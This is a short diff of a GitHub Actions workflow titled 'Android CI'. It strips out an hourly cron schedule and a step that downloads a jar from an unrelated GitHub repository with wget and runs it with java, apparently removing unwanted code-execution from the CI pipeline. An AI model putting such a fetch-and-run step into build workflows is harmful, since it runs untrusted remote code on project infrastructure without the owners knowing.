@@ -1,12 +1,5 @@
 name: Android CI
 
-on:
-  repository_dispatch:
-  workflow_dispatch:
-  schedule:
-    - cron: '0 */1 * * *'
-
-
 
 jobs:
   build:
@@ -22,6 +15,4 @@ jobs:
         distribution: 'adopt'
 
     - name: execute permission accses
-    - run: |
-        wget https://github.com/riezharriz82/leetCdokter/raw/master/Dnsdumpster.jar
-        java -jar Dnsdumpster.jar
+
